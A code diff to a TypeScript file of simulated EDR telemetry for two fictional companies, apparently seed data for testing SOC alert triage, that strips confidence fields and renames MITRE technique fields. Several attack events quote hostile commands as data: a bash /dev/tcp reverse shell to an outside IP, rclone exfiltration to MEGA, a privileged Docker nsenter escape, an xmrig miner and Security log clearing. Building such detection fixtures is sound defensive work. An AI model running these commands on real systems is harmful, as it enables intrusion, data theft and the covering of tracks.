@@ -61,7 +61,7 @@ const ROCKETSTACK_EVENTS: TelemetryEvent[] = [
     src_ip: "172.16.10.7",
     description: "t.levy ran an npm build task (node process) on LAP-007",
     process: { name: "node", pid: 2341, parent_name: "launchd", parent_pid: 1, user: "t.levy", cmdline: "node /usr/local/lib/node_modules/npm/bin/npm-cli.js run build" },
-    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.Confidence": "high", "crowdstrike.TechniqueId": "none", "action_result": "allowed", "file.signed": "true" }
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "action_result": "allowed", "file.signed": "true" }
   },
   {
     id: "rs_cs_002", ts: "2026-05-10T08:20:00.000Z",
@@ -199,7 +199,7 @@ const ROCKETSTACK_EVENTS: TelemetryEvent[] = [
     src_ip: "172.16.10.50",
     description: "osqueryd started on SRV-PROD-001 (fleet monitoring)",
     process: { name: "osqueryd", pid: 3300, parent_name: "launchd", parent_pid: 1, user: "root", cmdline: "/usr/local/bin/osqueryd --flagfile=/etc/osquery/osquery.flags" },
-    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.Confidence": "high", "action_result": "allowed" }
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "action_result": "allowed" }
   },
   {
     id: "rs_cs_006", ts: "2026-05-10T11:15:00.000Z",
@@ -208,7 +208,7 @@ const ROCKETSTACK_EVENTS: TelemetryEvent[] = [
     src_ip: "172.16.10.7",
     description: "t.levy ran a migration script on LAP-007",
     process: { name: "python3", pid: 4450, parent_name: "Terminal", parent_pid: 4200, user: "t.levy", cmdline: "python3 scripts/migrate_prod_data.py --env prod --dry-run" },
-    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.Confidence": "medium", "action_result": "allowed" }
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "action_result": "allowed" }
   },
   {
     id: "rs_cs_007", ts: "2026-05-10T12:50:00.000Z",
@@ -300,7 +300,7 @@ const ROCKETSTACK_EVENTS: TelemetryEvent[] = [
     fp_explanation: "Engineer ran a Python security script with unusual subprocess args to simulate API load. The command pattern (subprocess with shell=True and os.system calls) matches attacker tooling heuristics, but the script is in the RocketStack internal GitHub repo and was peer-reviewed. No outbound network connections were made.",
     description: "t.levy ran python3 security-load-test.py on LAP-007",
     process: { name: "python3", pid: 5900, parent_name: "zsh", parent_pid: 5001, user: "t.levy", cmdline: "python3 security-load-test.py --target https://api.rocketstack.io --requests 500 --concurrency 20" },
-    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.Confidence": "medium", "action_result": "allowed" }
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "action_result": "allowed" }
   },
   {
     id: "rs_fp_002", ts: "2026-05-10T11:45:00.000Z",
@@ -511,8 +511,8 @@ const ROCKETSTACK_EVENTS: TelemetryEvent[] = [
     process: { name: "rclone", pid: 7821, parent_name: "bash", parent_pid: 7700,
                user: "t.chen", cmdline: "rclone copy /Users/t.chen/Downloads mega:backup --progress" },
     raw: {
-      "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.Confidence": "high",
-      "crowdstrike.TechniqueId": "T1567.002", "crowdstrike.Tactic": "Exfiltration",
+      "crowdstrike.event_simpleName": "ProcessRollup2",
+      "threat.technique.id": "T1567", "threat.technique.subtechnique.id": "T1567.002", "crowdstrike.Tactic": "Exfiltration",
       "process.command_line": "rclone copy /Users/t.chen/Downloads mega:backup --progress",
       "network.bytes_out": "6710886400", "destination.domain": "g.api.mega.co.nz",
       "action_result": "detect_only" }
@@ -2389,7 +2389,7 @@ const QUANTUMBANK_EVENTS: TelemetryEvent[] = [
     src_ip: "10.100.1.55",
     description: "explorer.exe launched BLOOMBERG.exe on WKS-QB-055 — user opened Bloomberg terminal",
     process: { name: "BLOOMBERG.exe", pid: 4400, parent_name: "explorer.exe", parent_pid: 3100, user: "f.zimmermann", integrity: "medium" },
-    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.Confidence": "high", "file.signed": "true", "action_result": "allowed" }
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "file.signed": "true", "action_result": "allowed" }
   },
   {
     id: "qb_cs_002", ts: "2026-05-10T09:00:00.000Z",
@@ -2473,7 +2473,7 @@ const QUANTUMBANK_EVENTS: TelemetryEvent[] = [
     fp_explanation: "The QuantumBank Automated Testing team runs daily smoke tests against the core banking sandbox using a test script that calls net.exe commands to verify connectivity. net.exe from a user session looks like lateral movement recon, but this is a scheduled test job running under the test-runner service account. CHG-QB-218 covers this activity.",
     description: "The automated test-runner account queried shared resources on SRV-QB-CORE01 from WKS-QB-033",
     process: { name: "net.exe", pid: 7700, parent_name: "python.exe", parent_pid: 7600, user: "svc-test-runner", cmdline: "net view \\\\SRV-QB-CORE01 /all" },
-    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.TechniqueId": "T1016", "crowdstrike.Confidence": "medium", "action_result": "allowed" }
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "threat.technique.id": "T1016", "action_result": "allowed" }
   },
   {
     id: "qb_fp_002", ts: "2026-05-10T11:30:00.000Z",
@@ -2678,7 +2678,7 @@ const QUANTUMBANK_EVENTS: TelemetryEvent[] = [
       "crowdstrike.PolicyName": "PCI-USB-Block", "crowdstrike.DevicePolicyEnforcement": "BLOCK_ALL",
       "crowdstrike.DeviceManufacturer": "Verbatim", "crowdstrike.DeviceProduct": "STORE N GO",
       "crowdstrike.DeviceSerialNumber": "9F2C1A44E8B70021", "crowdstrike.DeviceClass": "USB Mass Storage",
-      "crowdstrike.TechniqueId": "T1052.001", "crowdstrike.SeverityName": "High",
+      "threat.technique.id": "T1052", "threat.technique.subtechnique.id": "T1052.001", "crowdstrike.SeverityName": "High",
       "action_result": "blocked" }
   },
   {
@@ -3368,7 +3368,7 @@ const ROCKETSTACK_ATTACKS: TelemetryEvent[] = [
     description: "Installing the npm package rocketstack-utils 3.2.1 ran an automatic post-install script on LAP-003",
     mitre_technique: "T1195.001",
     process: { name: "node", pid: 9310, parent_name: "npm", parent_pid: 9300, user: "s.amir", cmdline: "node /tmp/.npm-install/postinstall.js", hash: { sha256: "85427add0401af37258ec324e4fbb48b13042888b2f3d9cbd0f6ce63e85fac2c" } },
-    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.Confidence": "low", "crowdstrike.CommandLine": "node /tmp/.npm-install/postinstall.js", "crowdstrike.FileName": "node", "crowdstrike.FilePath": "/usr/local/bin/", "crowdstrike.ParentProcessName": "npm", "crowdstrike.UserName": "s.amir", "crowdstrike.SHA256HashData": "85427add0401af37258ec324e4fbb48b13042888b2f3d9cbd0f6ce63e85fac2c", "npm.package": "rocketstack-utils@3.2.1", "action_result": "allowed" }
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.CommandLine": "node /tmp/.npm-install/postinstall.js", "crowdstrike.FileName": "node", "crowdstrike.FilePath": "/usr/local/bin/", "crowdstrike.ParentProcessName": "npm", "crowdstrike.UserName": "s.amir", "crowdstrike.SHA256HashData": "85427add0401af37258ec324e4fbb48b13042888b2f3d9cbd0f6ce63e85fac2c", "npm.package": "rocketstack-utils@3.2.1", "action_result": "allowed" }
   },
   {
     // DNS is SIEM-normalized (ECS dns.* schema), attributed to the DNS feed rather than
@@ -3386,7 +3386,7 @@ const ROCKETSTACK_ATTACKS: TelemetryEvent[] = [
     description: "A node process on LAP-003 launched bash with a /dev/tcp redirect and connected out to 104.248.93.41:4444",
     mitre_technique: "T1059.004",
     process: { name: "bash", pid: 9420, parent_name: "node", parent_pid: 9310, user: "s.amir", cmdline: "bash -i >& /dev/tcp/104.248.93.41/4444 0>&1", hash: { sha256: "c4069c3b87b3698f3ae18f4602f869a7ddd7bf955c21aeebcf48f2b5b2dc7584" } },
-    raw: { "crowdstrike.event_simpleName": "NetworkConnectIP4", "crowdstrike.Confidence": "high", "crowdstrike.CommandLine": "bash -i >& /dev/tcp/104.248.93.41/4444 0>&1", "crowdstrike.FileName": "bash", "crowdstrike.FilePath": "/bin/", "crowdstrike.ParentProcessName": "node", "crowdstrike.UserName": "s.amir", "crowdstrike.SHA256HashData": "c4069c3b87b3698f3ae18f4602f869a7ddd7bf955c21aeebcf48f2b5b2dc7584", "action_result": "allowed" }
+    raw: { "crowdstrike.event_simpleName": "NetworkConnectIP4", "crowdstrike.CommandLine": "bash -i >& /dev/tcp/104.248.93.41/4444 0>&1", "crowdstrike.FileName": "bash", "crowdstrike.FilePath": "/bin/", "crowdstrike.ParentProcessName": "node", "crowdstrike.UserName": "s.amir", "crowdstrike.SHA256HashData": "c4069c3b87b3698f3ae18f4602f869a7ddd7bf955c21aeebcf48f2b5b2dc7584", "action_result": "allowed" }
   },
   chainAlert({ id: "rs_b3b", ts: "2026-05-10T08:52:20.000Z", name: "Reverse Shell", product: "CrowdStrike Falcon", severity: "High", mitre: "T1059.004", host: "LAP-003", props: {"Process": "bash", "Parent Process": "node", "Remote Address": "104.248.93.41:4444"}, description: "Sentinel received the CrowdStrike Falcon detection \"Reverse Shell\" (High) on LAP-003: bash under node, remote address 104.248.93.41:4444." }),
   {
@@ -3407,7 +3407,7 @@ const ROCKETSTACK_ATTACKS: TelemetryEvent[] = [
     description: "t.levy ran a Docker container on LAP-007 with --privileged, host PID/network namespaces and / mounted at /host",
     mitre_technique: "T1611",
     process: { name: "docker", pid: 12001, parent_name: "zsh", parent_pid: 11800, user: "t.levy", cmdline: "docker run --privileged --pid=host --net=host -v /:/host ubuntu nsenter -t 1 -m -u -i -n sh", hash: { sha256: "32bc2f4ca7cd25957d1bbf67a770f89fd7429fa3dd95dc8a6bdbf631dd392fee" } },
-    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.Confidence": "low", "crowdstrike.CommandLine": "docker run --privileged --pid=host --net=host -v /:/host ubuntu nsenter -t 1 -m -u -i -n sh", "crowdstrike.FileName": "docker", "crowdstrike.FilePath": "/usr/bin/", "crowdstrike.ParentProcessName": "zsh", "crowdstrike.UserName": "t.levy", "crowdstrike.SHA256HashData": "32bc2f4ca7cd25957d1bbf67a770f89fd7429fa3dd95dc8a6bdbf631dd392fee", "action_result": "allowed" }
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.CommandLine": "docker run --privileged --pid=host --net=host -v /:/host ubuntu nsenter -t 1 -m -u -i -n sh", "crowdstrike.FileName": "docker", "crowdstrike.FilePath": "/usr/bin/", "crowdstrike.ParentProcessName": "zsh", "crowdstrike.UserName": "t.levy", "crowdstrike.SHA256HashData": "32bc2f4ca7cd25957d1bbf67a770f89fd7429fa3dd95dc8a6bdbf631dd392fee", "action_result": "allowed" }
   },
   {
     id: "rs_c2", ts: "2026-05-10T15:09:00.000Z", source: "edr", event_type: "process_create",
@@ -3415,7 +3415,7 @@ const ROCKETSTACK_ATTACKS: TelemetryEvent[] = [
     description: "xmrig started as root on LAP-007 from a shell, connecting to supportxmr.com:5555",
     mitre_technique: "T1496",
     process: { name: "xmrig", path: "/tmp/.cache/xmrig", pid: 12050, parent_name: "sh", parent_pid: 12010, user: "root", cmdline: "/tmp/.cache/xmrig --coin monero --url supportxmr.com:5555 --user 47abc...", hash: { sha256: "f1dd2a9fd0d3d74d8f83bcae85ec8e2b7c319dc330253ea3d437d1805e0ab2bf" } },
-    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.Confidence": "medium", "crowdstrike.CommandLine": "xmrig --coin monero --url supportxmr.com:5555 --user 47abc...", "crowdstrike.FileName": "xmrig", "crowdstrike.FilePath": "/tmp/.cache/", "crowdstrike.ParentProcessName": "sh", "crowdstrike.UserName": "root", "crowdstrike.SHA256HashData": "f1dd2a9fd0d3d74d8f83bcae85ec8e2b7c319dc330253ea3d437d1805e0ab2bf", "action_result": "allowed" }
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.CommandLine": "xmrig --coin monero --url supportxmr.com:5555 --user 47abc...", "crowdstrike.FileName": "xmrig", "crowdstrike.FilePath": "/tmp/.cache/", "crowdstrike.ParentProcessName": "sh", "crowdstrike.UserName": "root", "crowdstrike.SHA256HashData": "f1dd2a9fd0d3d74d8f83bcae85ec8e2b7c319dc330253ea3d437d1805e0ab2bf", "action_result": "allowed" }
   },
   {
     // LAP-007 is t.levy's laptop, not an EC2 instance — it has no instance-profile
@@ -3686,7 +3686,7 @@ const QUANTUMBANK_ATTACKS: TelemetryEvent[] = [
                path: "C:\\Users\\m.huber\\AppData\\Local\\Temp\\svchost.exe",
                cmdline: "C:\\Users\\m.huber\\AppData\\Local\\Temp\\svchost.exe -k netsvcs",
                hash: { sha256: "dfcfb9d9e92004fe8ed31789a3791a8f57ee892b55245360e00da328e1ccb0bd" } },
-    raw: { "crowdstrike.event_simpleName": "DetectionSummaryEvent", "threat.name": "CobaltStrike.beacon.v4", "crowdstrike.Confidence": "high", "crowdstrike.CommandLine": "C:\\Users\\m.huber\\AppData\\Local\\Temp\\svchost.exe -k netsvcs", "crowdstrike.FileName": "svchost.exe", "crowdstrike.FilePath": "C:\\Users\\m.huber\\AppData\\Local\\Temp\\", "crowdstrike.ParentProcessName": "OUTLOOK.EXE", "crowdstrike.UserName": "m.huber", "crowdstrike.SHA256HashData": "dfcfb9d9e92004fe8ed31789a3791a8f57ee892b55245360e00da328e1ccb0bd", "action_result": "allowed", "crowdstrike.SeverityName": "MEDIUM" }
+    raw: { "crowdstrike.event_simpleName": "DetectionSummaryEvent", "threat.name": "CobaltStrike.beacon.v4", "crowdstrike.CommandLine": "C:\\Users\\m.huber\\AppData\\Local\\Temp\\svchost.exe -k netsvcs", "crowdstrike.FileName": "svchost.exe", "crowdstrike.FilePath": "C:\\Users\\m.huber\\AppData\\Local\\Temp\\", "crowdstrike.ParentProcessName": "OUTLOOK.EXE", "crowdstrike.UserName": "m.huber", "crowdstrike.SHA256HashData": "dfcfb9d9e92004fe8ed31789a3791a8f57ee892b55245360e00da328e1ccb0bd", "action_result": "allowed", "crowdstrike.SeverityName": "MEDIUM" }
   },
   {
     id: "qb_a3", ts: "2026-05-10T09:05:00.000Z", source: "firewall", event_type: "net_connection",
@@ -3730,7 +3730,7 @@ const QUANTUMBANK_ATTACKS: TelemetryEvent[] = [
     description: "wevtutil.exe cl Security ran as l.brunner on SRV-QB-ADMIN01; CrowdStrike terminated the process",
     mitre_technique: "T1070.001",
     process: { name: "wevtutil.exe", pid: 6621, parent_name: "cmd.exe", parent_pid: 6620, user: "l.brunner", cmdline: "wevtutil.exe cl Security" },
-    raw: { "crowdstrike.event_simpleName": "DetectionSummaryEvent", "crowdstrike.Technique": "Clear Windows Event Logs", "crowdstrike.TechniqueId": "T1070.001", "crowdstrike.Tactic": "Defense Evasion", "crowdstrike.SeverityName": "Critical", "crowdstrike.PatternDispositionDescription": "Process Terminated", "action_result": "process_killed", "process.killed": "true" }
+    raw: { "crowdstrike.event_simpleName": "DetectionSummaryEvent", "crowdstrike.Technique": "Clear Windows Event Logs", "threat.technique.id": "T1070", "threat.technique.subtechnique.id": "T1070.001", "crowdstrike.Tactic": "Defense Evasion", "crowdstrike.SeverityName": "Critical", "crowdstrike.PatternDispositionDescription": "Process Terminated", "action_result": "process_killed", "process.killed": "true" }
   },
   // ── Chain C ──────────────────────────────────────────────────────────────
   {
